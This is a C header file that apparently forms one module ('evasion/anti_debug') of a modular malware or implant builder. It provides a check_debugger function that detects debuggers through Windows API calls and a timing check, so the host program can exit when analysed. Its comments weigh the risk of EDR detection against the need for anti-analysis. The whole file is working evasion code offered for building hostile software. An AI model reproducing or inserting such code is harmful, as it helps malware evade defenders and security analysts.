// chunk: evasion/anti_debug
// depends: (none)
// provides: check_debugger
// risk: high
// note: multi-method debugger detection — exits if analysis environment detected
// WARNING: IsDebuggerPresent and CheckRemoteDebuggerPresent are KNOWN malware
//   indicators that EDRs specifically flag. Using this chunk increases detection
//   probability. Only include when anti-analysis is explicitly required.

#ifndef CHUNK_ANTI_DEBUG
#define CHUNK_ANTI_DEBUG

#include <windows.h>

static int check_debugger(void) {
    if (IsDebuggerPresent()) return 1;

    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    if (remote) return 1;

    LARGE_INTEGER freq, t1, t2;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&t1);
    Sleep(1);
    QueryPerformanceCounter(&t2);
    double elapsed = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart;
    if (elapsed > 1.0) return 1;

    return 0;
}

#endif
